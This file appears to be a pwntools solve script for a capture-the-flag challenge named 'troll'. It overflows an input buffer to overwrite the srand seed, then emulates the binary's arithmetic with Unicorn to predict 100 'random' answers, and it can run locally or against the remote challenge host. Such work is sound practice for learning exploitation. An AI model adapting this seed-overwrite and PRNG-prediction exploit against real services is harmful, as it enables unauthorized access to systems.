#!/usr/bin/env python2

"""
Run exploit locally with:
./solve.py

Run against remote with:
./solve.py REMOTE HOST=challenges.tamuctf.com PORT=4765
"""

from __future__ import print_function

from pwn import *
from unicorn import *
from unicorn.x86_const import *

context.arch = 'amd64'

PROG_PATH = './troll'
SEED_OFFSET = 64

EMU_ADDRESS = 0x1000000
ASSEMBLY = asm("""\
mov     ecx, eax
mov     edx, 0x14f8b589
mov     eax, ecx
imul    edx
sar     edx, 0xd
mov     eax, ecx
sar     eax, 0x1f
sub     edx, eax
mov     eax, edx
imul    eax, eax, 0x186a0
sub     ecx, eax
mov     eax, ecx
add     eax, 0x1""")


def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ['tmux', 'vsplit', '-h']

    if not args['REMOTE']:
        context.log_level = 'debug'


def init_io():
    if args['REMOTE']:
        return remote(args['HOST'], int(args['PORT']))
    else:
        pty = process.PTY
        return process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)


def emulate(rand):
    mu = Uc(UC_ARCH_X86, UC_MODE_64)
    mu.mem_map(EMU_ADDRESS, 2 * 1024 * 1024)
    mu.mem_write(EMU_ADDRESS, ASSEMBLY)

    mu.reg_write(UC_X86_REG_EAX, rand)
    mu.emu_start(EMU_ADDRESS, EMU_ADDRESS + len(ASSEMBLY))

    eax = mu.reg_read(UC_X86_REG_EAX)
    return eax


def win(io):
    with open('rand.lst', 'r') as f:
        rands = [
            int(line.strip()) for line in f if line.strip()
        ]

    io.recvuntil('goes there?\n')
    io.sendline(b'A' * SEED_OFFSET + b'B' * 8)

    # We just called srand(0x42424242), so we we know the "random"
    # stream of numbers that will be generated.
    for i in range(0x64):
        answer = emulate(rands[i])
        io.recvuntil('What is it?\n')
        io.sendline(str(answer))

    io.recvline()
    io.recvline()
    print(io.recvline())


if __name__ == '__main__':
    init_pwntools_context()
    io = init_io()
    win(io)
